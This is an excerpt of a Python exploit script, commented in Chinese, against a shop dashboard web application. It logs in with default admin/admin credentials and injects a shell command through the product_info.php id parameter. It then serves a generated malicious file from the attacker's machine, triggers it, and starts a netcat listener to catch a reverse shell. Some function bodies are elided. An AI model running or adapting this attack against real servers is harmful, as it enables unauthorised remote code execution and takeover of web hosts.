...
def create_payload(remote_cmd):
    # 計算 remote_cmd 的字元長度
    cmd_length = len(f"' && {remote_cmd} && echo'")
...
def inject_payload(target_url, encoded_payload, cookies=None):
    injection_url = f"http://{target_url}/shop/dashboard/?page=product_info.php&id=1;"
    injection_payload = (
...
def get_id(target_url, cookies=None):
    get_id_url = f"http://{target_url}/shop/dashboard/?page=products.php"
...
def trigger_payload(target_url, product_id, cookies=None):
    trigger_url = f"http://{target_url}/shop/dashboard/?page=product_info.php&id={product_id}"
...
if __name__ == "__main__":
    ...
    parser.add_argument("-r", "--rhost", required=True, help="Target IP")
    parser.add_argument("-l", "--lhost", required=True, help="localhost IP")
    parser.add_argument("-p", "--lport", required=True, help="localhost PORT")
    args = parser.parse_args()

    # 提取參數
    TARGET_IP = args.rhost
    LOCAL_IP = args.lhost
    ...
    login_url = f"http://{TARGET_IP}/shop/dashboard/login.php"
    login_data = {
        "username": "admin",
        "password": "admin"
    }
    ...
    # 產生惡意檔案
    generate_payload(LOCAL_IP, LOCAL_PORT, output_file)
    ...
    inject_payload(TARGET_IP, payload, cookies=COOKIES)
    product_id = get_id(TARGET_IP, cookies=COOKIES)
    trigger_payload(TARGET_IP, product_id, cookies=COOKIES)
    
    # 關閉伺服器
    stop_http_server(server_process)
    
    # 啟動 Netcat 的執行緒
    listener_thread = threading.Thread(target=start_netcat_listener, args=(LOCAL_PORT,))
